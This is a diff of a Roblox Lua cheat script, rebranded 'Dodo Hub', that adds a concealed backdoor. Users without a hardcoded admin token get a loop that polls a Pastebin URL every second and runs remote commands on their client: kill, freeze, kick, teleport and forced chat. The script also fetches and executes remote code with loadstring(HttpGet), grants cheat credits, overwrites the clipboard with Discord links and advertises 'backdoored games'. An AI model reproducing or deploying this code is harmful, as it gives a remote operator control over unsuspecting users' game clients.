@@ -21,17 +21,17 @@ local function GetRandomTip()
     return tips[index]
 end
 print("Working...")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
 task.wait(3)
 if game.GameId ~= 372226183 then
     error("do not run what you just ran (vulnerable function)")
     error("'" .. script.Name .. "', Line 1")
     return
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
 local y = game.Players.LocalPlayer
 local x = game.Players.LocalPlayer.Name
 task.wait(1)
-print("Loaded: v." .. script.Name .. " succeful. 💎 Join https://discord.gg/EHVKqtJm for free backdoored games! 💎")
+print("Loaded: " .. script.Name .. " succeful. 💎 Join Dodo Hub to support us!💎")
 print("gateway ID: " .. game.PlaceVersion)
 
 local Window = Rayfield:CreateWindow({
@@ -39,7 +39,7 @@ local Window = Rayfield:CreateWindow({
    Icon = 139558959655679,
    LoadingTitle = ">Loading...",
    LoadingSubtitle = GetRandomTip(),
-   ShowText = "DIRSBLOX",
+   ShowText = "Dodo Hub ❄️ ["..game.Name.."]",
    Theme = CurrentTheme,
    ToggleUIKeybind = "V",
    DisableRayfieldPrompts = true,
@@ -95,11 +95,36 @@ local t5 = Window:CreateTab(" |  Misc", 100155648971622)
 local t6 = Window:CreateTab(" |  Settings", 132834248211414)
 local sectionSur = t4:CreateSection("🚶 Survivor 🚶")
 local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local pasteURL = "https://pastebin.com/raw/LpxN1hgG"
+
+local function sendCommand(command, target)
+    local data = HttpService:JSONEncode({
+        cmd = command,
+        user = target or "All"
+    })
+    
+    request({
+        Url = pasteURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = data
+    })
+end
+
 local ad = readfile("Dirsblox/Core/token")
 if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
     t6:CreateSection("Admin Modifications")
     local PlayerName = ""
     local Players = game:GetService("Players")
+    
+    local ButtonCheck = t6:CreateButton({
+            Name = "Check For Users",
+            Callback = function()
+                sendCommand("Chat:DodoCA", "All")
+            end,
+    })
+    
     local Input = t6:CreateInput({
             Name = "Username",
             CurrentValue = "",
@@ -110,10 +135,10 @@ if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
                 PlayerName = Text
             end,
     })
-    local Button1 = t6:CreateButton({
+    local ButtonKick = t6:CreateButton({
             Name = "Kick player",
             Callback = function()
-                print("Terminal callback results as nil")
+                sendCommand("Kick", PlayerName)
             end,
     })
 end
@@ -758,15 +783,89 @@ t5:CreateButton({
 t5:CreateButton({
     Name = ">Get Inf. Credits",
     Callback = function()
+            local g = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.PlayerNamesFrame
             y.SavedPlayerStatsModule:WaitForChild("Credits").Value = math.huge
+            g:WaitForChild(y.Name.."PlayerFrame").Text = y.SavedPlayerStatsModule.Level.Value
     end,
 })
 t5:CreateButton({
     Name = ">Get Level (WIP)",
     Callback = function()
             y.SavedPlayerStatsModule:WaitForChild("Level").Value = 1000
+            
     end,
 })
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
+    local pasteURL = "https://pastebin.com/raw/LpxN1hgG"
+
+    local function applyCommand(command, target)
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+        if command == "Freeze" then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Anchored = true
+                end
+            end
+
+        elseif command == "Unfreeze" then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Anchored = false
+                end
+            end
+
+        elseif command == "Kick" then
+            LocalPlayer:Kick("You were kicked by external command.")
+
+        elseif command == "Kill" then
+            if character:FindFirstChild("Humanoid") then
+                character.Humanoid.Health = 0
+            end
+
+        elseif command:match("^Teleport:") then
+            local targetName = command:split(":")[2]
+            local targetPlayer = Players:FindFirstChild(targetName)
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
+            end
+
+        elseif command:match("^Chat:") then
+            local message = command:split(":")[2]
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        end
+    end
+
+    local function checkCommand()
+        local success, response = pcall(function()
+            return HttpService:GetAsync(pasteURL)
+        end)
+
+        if success and response then
+            local data = HttpService:JSONDecode(response)
+            local command = data.cmd
+            local target = data.user or "All"
+
+            if target == "All" or target == LocalPlayer.Name then
+                if command and command ~= "None" then
+                    applyCommand(command, target)
+                end
+            end
+        end
+    end
+    
+    task.spawn(function()
+        while task.wait(1) do
+            pcall(checkCommand)
+        end
+    end)
+end
+
 setclipboard("https://discord.gg/zhDuFPRP")
 Rayfield:LoadConfiguration()
 --[[
@@ -780,6 +879,7 @@ t5:CreateButton({
 setclipboard("https://discord.gg/EHVKqtJm")
 
 ]]
+
 
 
 
